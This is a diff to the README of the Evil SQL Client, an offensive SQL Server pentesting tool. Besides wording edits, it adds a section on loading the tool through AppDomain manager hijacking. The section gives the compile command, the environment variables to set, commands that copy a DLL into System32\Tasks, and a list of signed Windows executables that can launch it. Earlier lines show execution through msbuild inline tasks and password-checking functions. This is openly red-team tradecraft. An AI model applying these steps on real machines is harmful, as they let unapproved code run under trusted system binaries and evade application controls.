@@ -50,7 +50,7 @@ Below is a list of options for running the Evil SQl Client (ESC).
 
 ![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-compile-2.png)
   
-### Download and Run via MSbuild.exe <a name="runmsbuild"></a>
+### Download and Run through MSbuild.exe <a name="runmsbuild"></a>
  
 Evil SQL Client console can be run through msbuild inline tasks using the [esc.csproj file](https://github.com/NetSPI/ESC/blob/master/esc.csproj) or [esc.xml file](https://github.com/NetSPI/ESC/blob/master/esc.xml).<br>  Using msbuild.exe to execute .net code through inline tasks is a technique that was researched and popularized by Casey Smith. 
 
@@ -82,7 +82,7 @@ In the examples below, esc.csproj has been renamed to 1.csproj:
  `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.xml` <br>
 ![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-msbuild-2.png) 
 	
-### Download and Run Functions via PowerShell <a name="runps"></a>
+### Download and Run Functions through PowerShell <a name="runps"></a>
 Below are some quick instructions for running ESC functions through PowerShell.
 
 1. Download esc.exe.
@@ -101,6 +101,59 @@ Below are some quick instructions for running ESC functions through PowerShell.
 [evilsqlclient.Program+EvilCommands]::CheckDefaultAppPw()
 [evilsqlclient.Program+EvilCommands]::CheckLoginAsPw()
 [evilsqlclient.Program+EvilCommands]::MasterAccessList
+</pre>
+
+### Download and Run through AppDomain Hijacking<a name="runmsbuild"></a>
+Below are instructions for using the AppDomain hijacking technique shared in Casey Smith's DerbyCon presentation ".Net Manifesto - Win Friends and Influence the Loader" to load ESC through c:\windows\system32\ applications that import mscoree.dll. 
+
+1. Compile this dll.
+<pre>
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.Reflection.dll /r:Microsoft.Build.Framework.dll /r:Microsoft.Build.Utilities.v4.0.dll /r:System.IO.Compression.dll /r:System.Runtime.InteropServices.dll /r:System.EnterpriseServices.dll /target:library /out:tasks.dll tasks.cs			
+</pre>
+
+2. Update environment variables. Note: process, user, or system could be targeted.
+<pre>
+set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+set APPDOMAIN_MANAGER_TYPE=Esc
+set COMPLUS_Version=v4.0.30319
+</pre>
+
+3. Copy tasks.dll to target directory.
+<pre>
+copy tasks.dll C:\Windows\System32\Tasks\tasks.dll 
+copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll
+</pre>
+
+4. Identify .exe in c:\windows\system32\ that load mscoreee.dll.  This can be done quickly using the Get-PE from Matt Graeber's [PowerShell Arsenal Project](https://github.com/mattifestation/PowerShellArsenal).
+<pre>
+gci c:\windows\system32\*.exe | get-pe | where-object {$_.Imports.ModuleName -Contains "mscoree.dll"} | Select ModuleName -ExpandProperty modulename
+</pre>
+
+5. Choose one of the affected commands and run it.
+<pre>
+Examples:
+C:\windows\system32\acu.exe
+C:\windows\system32\aitstatic.exe
+C:\windows\system32\ClusterUpdateUI.exe
+C:\windows\system32\dsac.exe
+C:\windows\system32\FileHistory.exe
+C:\windows\system32\LbfoAdmin.exe
+C:\windows\system32\Microsoft.Uev.SyncController.exe
+C:\windows\system32\mtedit.exe
+C:\windows\system32\PresentationHost.exe
+C:\windows\system32\RAMgmtUI.exe
+C:\windows\system32\ScriptRunner.exe
+C:\windows\system32\ServerManager.exe
+C:\windows\system32\ShieldingDataFileWizard.exe
+C:\windows\system32\stordiag.exe
+C:\windows\system32\SynapticsUtility.exe
+C:\windows\system32\TemplateDiskWizard.exe
+C:\windows\system32\TsWpfWrp.exe
+C:\windows\system32\UevAgentPolicyGenerator.exe
+C:\windows\system32\UevAppMonitor.exe
+C:\windows\system32\UevTemplateBaselineGenerator.exe
+C:\windows\system32\UevTemplateConfigItemGenerator.exe
+C:\windows\system32\Vmw.exe
 </pre>
 
  # Supported Commands <a name="supportedcommands"></a>
